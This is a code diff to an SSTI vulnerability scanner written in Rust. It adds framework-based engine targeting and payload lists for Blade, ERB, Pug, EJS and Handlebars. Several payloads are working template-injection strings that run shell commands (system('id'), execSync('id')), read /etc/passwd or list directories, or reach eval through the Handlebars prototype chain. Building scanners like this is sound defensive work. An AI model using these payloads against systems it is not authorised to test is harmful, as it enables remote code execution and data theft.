@@ -5,11 +5,21 @@
  * Bountyy Oy - Template Injection Scanner (SSTI)
  * Tests for Server-Side Template Injection vulnerabilities
  *
+ * Features:
+ * - Framework-aware payload selection
+ * - Context-based engine targeting
+ * - GraphQL and static content filtering
+ *
  * Detects:
- * - Jinja2 template injection (Python/Flask)
+ * - Jinja2 template injection (Python/Django/Flask)
  * - FreeMarker template injection (Java)
  * - Twig template injection (PHP/Symfony)
  * - Smarty template injection (PHP)
+ * - Blade template injection (PHP/Laravel)
+ * - ERB template injection (Ruby/Rails)
+ * - Pug template injection (Node.js)
+ * - EJS template injection (Node.js)
+ * - Handlebars template injection (Node.js)
  * - Mathematical expression evaluation
  * - Template engine fingerprinting
  * - RCE via template injection
@@ -20,7 +30,7 @@
 
 use crate::http_client::HttpClient;
 use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
-use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
+use crate::types::{Confidence, ScanConfig, Severity, Vulnerability, ScanContext, EndpointType};
 use std::sync::Arc;
 use tracing::{debug, info};
 
@@ -39,6 +49,7 @@ impl TemplateInjectionScanner {
         url: &str,
         param_name: &str,
         _config: &ScanConfig,
+        context: Option<&ScanContext>,
     ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         let mut vulnerabilities = Vec::new();
         let mut tests_run = 0;
@@ -47,6 +58,20 @@ impl TemplateInjectionScanner {
         if !crate::license::is_feature_available("template_injection") {
             debug!("[SSTI] Feature requires Professional license or higher");
             return Ok((vulnerabilities, tests_run));
+        }
+
+        // Skip if GraphQL endpoint
+        if let Some(ctx) = context {
+            if ctx.is_graphql {
+                debug!("[SSTI] Skipping GraphQL endpoint");
+                return Ok((vulnerabilities, tests_run));
+            }
+
+            // Skip if static content
+            if matches!(ctx.endpoint_type, EndpointType::StaticContent) {
+                debug!("[SSTI] Skipping static content endpoint");
+                return Ok((vulnerabilities, tests_run));
+            }
         }
 
         // Smart parameter filtering - skip framework internals
@@ -61,8 +86,8 @@ impl TemplateInjectionScanner {
 
         info!("Testing SSTI on parameter: {}", param_name);
 
-        // Template engines to test
-        let engines = vec!["jinja2".to_string(), "freemarker".to_string(), "twig".to_string(), "smarty".to_string()];
+        // Get framework-specific engines based on context
+        let engines = self.get_targeted_engines(context);
 
         for engine in engines {
             let payloads = self.get_engine_payloads(&engine);
@@ -104,12 +129,67 @@ impl TemplateInjectionScanner {
     /// Scan endpoint for template injection (general scan)
     pub async fn scan(
         &self,
-        url: &str,
-        config: &ScanConfig,
+        _url: &str,
+        _config: &ScanConfig,
     ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         // Only test parameters discovered from actual forms/URLs - no spray-and-pray
         // The main scanner will call scan_parameter() with discovered params
         Ok((Vec::new(), 0))
+    }
+
+    /// Get targeted template engines based on detected framework
+    fn get_targeted_engines(&self, context: Option<&ScanContext>) -> Vec<String> {
+        if let Some(ctx) = context {
+            // Check for framework-specific engines
+            if let Some(framework) = &ctx.framework {
+                let fw_lower = framework.to_lowercase();
+
+                // Django/Flask → Jinja2 payloads only
+                if fw_lower.contains("django") || fw_lower.contains("flask") {
+                    info!("[SSTI] Detected Django/Flask - using Jinja2 payloads");
+                    return vec!["jinja2".to_string()];
+                }
+
+                // Laravel → Blade payloads only
+                if fw_lower.contains("laravel") {
+                    info!("[SSTI] Detected Laravel - using Blade payloads");
+                    return vec!["blade".to_string()];
+                }
+
+                // Ruby/Rails → ERB payloads
+                if fw_lower.contains("rails") || fw_lower.contains("ruby") {
+                    info!("[SSTI] Detected Rails/Ruby - using ERB payloads");
+                    return vec!["erb".to_string()];
+                }
+
+                // Node.js/Express → Pug/EJS/Handlebars payloads
+                if fw_lower.contains("express") || fw_lower.contains("node") {
+                    info!("[SSTI] Detected Express/Node.js - using Pug/EJS/Handlebars payloads");
+                    return vec!["pug".to_string(), "ejs".to_string(), "handlebars".to_string()];
+                }
+            }
+
+            // Check detected technologies for PHP frameworks
+            if ctx.has_tech("php") || ctx.has_tech("symfony") {
+                info!("[SSTI] Detected PHP - using Twig/Smarty payloads");
+                return vec!["twig".to_string(), "smarty".to_string()];
+            }
+
+            // Check for Java frameworks → FreeMarker
+            if ctx.has_tech("java") || ctx.has_tech("tomcat") || ctx.has_tech("spring") {
+                info!("[SSTI] Detected Java - using FreeMarker payloads");
+                return vec!["freemarker".to_string()];
+            }
+        }
+
+        // Default: test all common engines if no framework detected
+        debug!("[SSTI] No specific framework detected - using all template engines");
+        vec![
+            "jinja2".to_string(),
+            "freemarker".to_string(),
+            "twig".to_string(),
+            "smarty".to_string(),
+        ]
     }
 
     /// Get payloads for specific template engine
@@ -178,6 +258,92 @@ impl TemplateInjectionScanner {
                 // Detection
                 ("{$smarty.get.test}".to_string(), "GET variable".to_string()),
                 ("{if 7*7==49}vulnerable{/if}".to_string(), "Conditional".to_string()),
+            ],
+
+            "blade" => vec![
+                // Mathematical evaluation
+                ("{{7*7}}".to_string(), "Math evaluation 7*7".to_string()),
+                ("{{ 7*7 }}".to_string(), "Math evaluation with spaces".to_string()),
+
+                // PHP code execution (Blade allows raw PHP)
+                ("@php echo 7*7; @endphp".to_string(), "PHP directive".to_string()),
+                ("@php system('id'); @endphp".to_string(), "PHP system command".to_string()),
+
+                // Variable access
+                ("{{$app}}".to_string(), "App object access".to_string()),
+                ("{{config('app')}}".to_string(), "Config access".to_string()),
+
+                // Detection
+                ("@{{7*7}}".to_string(), "Escaped expression check".to_string()),
+            ],
+
+            "erb" => vec![
+                // Mathematical evaluation
+                ("<%= 7*7 %>".to_string(), "Math evaluation 7*7".to_string()),
+                ("<%= 7 * 7 %>".to_string(), "Math with spaces".to_string()),
+
+                // Command execution
+                ("<%= `id` %>".to_string(), "Command via backticks".to_string()),
+                ("<%= system('id') %>".to_string(), "System command".to_string()),
+                ("<%= %x(id) %>".to_string(), "Command via %x".to_string()),
+
+                // Object access
+                ("<%= Dir.entries('/') %>".to_string(), "Directory listing".to_string()),
+                ("<%= File.read('/etc/passwd') %>".to_string(), "File read".to_string()),
+
+                // Detection
+                ("<% 7*7 %>".to_string(), "Silent evaluation".to_string()),
+            ],
+
+            "pug" => vec![
+                // Mathematical evaluation
+                ("#{7*7}".to_string(), "Math evaluation 7*7".to_string()),
+                ("= 7*7".to_string(), "Buffered code".to_string()),
+
+                // Command execution
+                ("- var x = process.mainModule.require('child_process').execSync('id').toString()".to_string(), "Command execution".to_string()),
+                ("#{global.process.mainModule.require('child_process').execSync('id')}".to_string(), "Inline command".to_string()),
+
+                // Object access
+                ("#{process.version}".to_string(), "Process version".to_string()),
+                ("#{global}".to_string(), "Global object".to_string()),
+
+                // Detection
+                ("- var test = 7*7".to_string(), "Unbuffered code".to_string()),
+            ],
+
+            "ejs" => vec![
+                // Mathematical evaluation
+                ("<%= 7*7 %>".to_string(), "Math evaluation 7*7".to_string()),
+                ("<%- 7*7 %>".to_string(), "Unescaped output".to_string()),
+
+                // Command execution
+                ("<%= global.process.mainModule.require('child_process').execSync('id').toString() %>".to_string(), "Command execution".to_string()),
+                ("<%- global.process.mainModule.constructor._load('child_process').execSync('id') %>".to_string(), "Alternative exec".to_string()),
+
+                // Object access
+                ("<%= process.version %>".to_string(), "Process version".to_string()),
+                ("<%= global %>".to_string(), "Global object".to_string()),
+
+                // Detection
+                ("<% var x = 7*7 %>".to_string(), "Scriptlet".to_string()),
+            ],
+
+            "handlebars" => vec![
+                // Mathematical evaluation (limited in Handlebars)
+                ("{{7*7}}".to_string(), "Expression test".to_string()),
+                ("{{this}}".to_string(), "Context access".to_string()),
+
+                // Prototype pollution / RCE attempts
+                ("{{#with \"constructor\"}}{{#with ../constructor}}{{#with constructor}}{{#with ../constructor}}{{lookup . 'eval'}}('return process'){{/with}}{{/with}}{{/with}}{{/with}}".to_string(), "Prototype chain".to_string()),
+                ("{{lookup (lookup this 'constructor') 'prototype'}}".to_string(), "Prototype access".to_string()),
+
+                // Helper exploitation
+                ("{{#each this}}{{@key}}: {{this}}{{/each}}".to_string(), "Object enumeration".to_string()),
+                ("{{#with this as |obj|}}{{obj.constructor.prototype}}{{/with}}".to_string(), "Constructor access".to_string()),
+
+                // Detection
+                ("{{.}}".to_string(), "Current context".to_string()),
             ],
 
             _ => vec![],
@@ -268,6 +434,39 @@ impl TemplateInjectionScanner {
                 body.contains("{php}") ||
                 body.contains("{/php}") ||
                 body.contains("Smarty_Internal")
+            },
+
+            "blade" => {
+                body.contains("Blade") ||
+                body.contains("Laravel") ||
+                (payload.contains("@php") && body.contains("49")) ||
+                (payload.contains("$app") && body.contains("Illuminate"))
+            },
+
+            "erb" => {
+                body.contains("ERB") ||
+                body.contains("Ruby") ||
+                (payload.contains("Dir.entries") && body.contains("[")) ||
+                (payload.contains("File.read") && body.contains("root:"))
+            },
+
+            "pug" => {
+                body.contains("Pug") ||
+                body.contains("Jade") ||
+                (payload.contains("process.version") && body.contains("v")) ||
+                (payload.contains("global") && body.contains("Object"))
+            },
+
+            "ejs" => {
+                body.contains("EJS") ||
+                (payload.contains("process.version") && body.contains("v")) ||
+                (payload.contains("global") && body.contains("Object"))
+            },
+
+            "handlebars" => {
+                body.contains("Handlebars") ||
+                body.contains("prototype") ||
+                (payload.contains("constructor") && body.contains("function"))
             },
 
             _ => false,
